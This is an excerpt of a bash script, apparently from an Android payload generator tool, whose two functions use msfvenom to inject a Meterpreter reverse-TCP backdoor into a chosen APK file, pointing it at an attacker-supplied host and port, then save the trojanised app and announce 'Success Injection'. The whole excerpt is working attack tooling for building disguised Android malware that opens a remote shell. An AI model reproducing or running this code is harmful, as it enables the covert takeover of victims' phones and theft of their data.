...
linjector() {
    ...
    sleep 1s
    echo ''
    msfvenom -x $POIA -p android/meterpreter/reverse_tcp LHOST=$lihost LPORT=$liport -o $HOME/GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk
    cp $HOME/GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk $oliapkpath
    rm -rf $HOME/GX-Tools/Android-Payload-Generator/Payload/*
    sleep 2s
    echo '' 
...
pinjector() {
    ...
    sleep 1s
    echo ''
    msfvenom -x $PPOIA -p android/meterpreter/reverse_tcp LHOST=$pihost LPORT=$piport -o $HOME/GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk
    cp $HOME/GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk $opiapkpath 
    rm -rf $HOME/GX-Tools/Android-Payload-Generator/Payload/*
    sleep 2s
    echo '' 
    echo -e $LGreen '';figlet -c -f slant "Success Injection"
